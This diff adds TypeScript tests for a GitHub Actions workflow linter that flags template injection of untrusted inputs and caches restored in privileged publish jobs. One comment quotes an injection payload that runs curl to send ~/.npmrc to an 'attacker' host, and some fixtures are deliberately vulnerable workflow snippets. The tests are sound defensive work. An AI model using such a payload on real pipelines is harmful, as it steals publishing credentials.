@@ -140,3 +140,177 @@ describe('lint_workflow_security — is_allowlisted', () => {
 // "cjs top-level await" limitation do not interfere. Each imports the module
 // by path, monkeypatches the scan dir + allowlist from env, then calls main().
 
+
+// --- road-to-boundaries-that-hold-at-release-and-runtime 2.1 / 2.2 ---------
+
+function wf(lines: string[]): string {
+    return [...lines, ''].join('\n');
+}
+
+const SHA = '0000000000000000000000000000000000000000';
+
+describe('lint_workflow_security — template-injection', () => {
+    // Abuse case: a dispatched input or release tag such as
+    // `x"; curl -d @$HOME/.npmrc attacker; "` executes in a job holding
+    // `id-token: write`. Free text reaches a shell only through `env:`.
+    let tmp: string;
+    beforeEach(() => {
+        tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'lws-ti-'));
+    });
+    afterEach(() => {
+        fs.rmSync(tmp, { recursive: true, force: true });
+    });
+
+    function scan(body: string): ReturnType<typeof scan_workflow> {
+        const p = path.join(tmp, 'w.yml');
+        fs.writeFileSync(p, body, 'utf-8');
+        return scan_workflow(p, []).filter((f) => f['rule'] === 'template-injection');
+    }
+
+    const head = [
+        'on:',
+        '  pull_request:',
+        '  workflow_dispatch:',
+        '    inputs:',
+        '      bump:',
+        '        type: choice',
+        '        options: [patch, minor]',
+        '      dry:',
+        '        type: boolean',
+        '      tag:',
+        '        type: string',
+        '      note:',
+        '        description: untyped',
+        'permissions:',
+        '  contents: read',
+        'jobs:',
+        '  j:',
+        '    runs-on: ubuntu-latest',
+        '    steps:',
+    ];
+
+    it('a PR title inline in run: is one HIGH finding', () => {
+        const found = scan(wf([...head, '      - run: echo "${{ github.event.pull_request.title }}"']));
+        expect(found).toHaveLength(1);
+        expect(found[0]!['severity']).toBe('HIGH');
+        expect(String(found[0]!['detail'])).toContain('github.event.pull_request.title');
+    });
+
+    it('the same value through env: is clean', () => {
+        expect(
+            scan(
+                wf([
+                    ...head,
+                    '      - env:',
+                    '          TITLE: ${{ github.event.pull_request.title }}',
+                    '        run: echo "$TITLE"',
+                ]),
+            ),
+        ).toEqual([]);
+    });
+
+    it('a choice, boolean, SHA, number or step output is not free text', () => {
+        expect(
+            scan(
+                wf([
+                    ...head,
+                    '      - run: |',
+                    '          echo "${{ inputs.bump }} ${{ github.event.inputs.dry }}"',
+                    '          echo "${{ github.sha }} ${{ github.event.pull_request.number }}"',
+                    '          echo "${{ steps.v.outputs.version }} ${{ github.run_id }}"',
+                ]),
+            ),
+        ).toEqual([]);
+    });
+
+    it('string and untyped inputs, release tags, head refs and commit messages are free text', () => {
+        const found = scan(
+            wf([
+                ...head,
+                '      - run: echo "${{ inputs.tag }}"',
+                '      - run: echo "${{ github.event.inputs.note }}"',
+                '      - run: echo "${{ github.event.release.tag_name || inputs.bump }}"',
+                '      - run: echo "${{ github.head_ref }}"',
+                '      - run: echo "${{ github.event.head_commit.message }}"',
+                '      - run: echo "${{ github.event.label.name }}"',
+            ]),
+        );
+        expect(found).toHaveLength(6);
+    });
+
+    it('github-script script: is a sink too, its other inputs are not', () => {
+        const found = scan(
+            wf([
+                ...head,
+                `      - uses: actions/github-script@${SHA}`,
+                '        with:',
+                '          github-token: ${{ github.event.pull_request.body }}',
+                '          script: core.info("${{ github.event.pull_request.body }}")',
+            ]),
+        );
+        expect(found).toHaveLength(1);
+    });
+});
+
+describe('lint_workflow_security — privileged-job-cache', () => {
+    // Abuse case: a poisoned Actions cache written by a lower-privilege workflow
+    // is restored into the OIDC publish job, so attacker modules run with a
+    // token that can publish the package.
+    let tmp: string;
+    beforeEach(() => {
+        tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'lws-pc-'));
+    });
+    afterEach(() => {
+        fs.rmSync(tmp, { recursive: true, force: true });
+    });
+
+    function scan(body: string): ReturnType<typeof scan_workflow> {
+        const p = path.join(tmp, 'w.yml');
+        fs.writeFileSync(p, body, 'utf-8');
+        return scan_workflow(p, []).filter((f) => f['rule'] === 'privileged-job-cache');
+    }
+
+    const setupNodeCache = [`      - uses: actions/setup-node@${SHA}`, '        with:', "          cache: 'npm'"];
+
+    it('a setup-* cache in a job inheriting workflow-level id-token: write is a finding', () => {
+        const found = scan(
+            wf(['on: push', 'permissions:', '  id-token: write', '  contents: read', 'jobs:', '  publish:', '    steps:', ...setupNodeCache]),
+        );
+        expect(found).toHaveLength(1);
+        expect(String(found[0]!['location'])).toContain('publish');
+    });
+
+    it('the same cache in a job overriding to contents: read is not', () => {
+        expect(
+            scan(
+                wf([
+                    'on: push',
+                    'permissions:',
+                    '  id-token: write',
+                    'jobs:',
+                    '  verify:',
+                    '    permissions:',
+                    '      contents: read',
+                    '    steps:',
+                    ...setupNodeCache,
+                ]),
+            ),
+        ).toEqual([]);
+    });
+
+    it('contents: write, write-all and a non-default secret are privileged; GITHUB_TOKEN alone is not', () => {
+        const job = (perm: string[], extra: string[] = []) =>
+            wf(['on: push', 'jobs:', '  j:', ...perm, '    steps:', ...extra, `      - uses: actions/cache@${SHA}`, '        with:', '          path: x', '          key: k']);
+        expect(scan(job(['    permissions:', '      contents: write']))).toHaveLength(1);
+        expect(scan(job(['    permissions: write-all']))).toHaveLength(1);
+        expect(scan(job([], ['      - run: echo hi', '        env:', '          T: ${{ secrets.NPM_TOKEN }}']))).toHaveLength(1);
+        expect(scan(job([], ['      - run: echo hi', '        env:', '          T: ${{ secrets.GITHUB_TOKEN }}']))).toEqual([]);
+        expect(scan(job(['    permissions:', '      contents: read']))).toEqual([]);
+    });
+
+    it('a setup-* action without with.cache is not a cache', () => {
+        expect(
+            scan(wf(['on: push', 'permissions:', '  id-token: write', 'jobs:', '  j:', '    steps:', `      - uses: actions/setup-node@${SHA}`, '        with:', '          node-version: 22'])),
+        ).toEqual([]);
+    });
+});
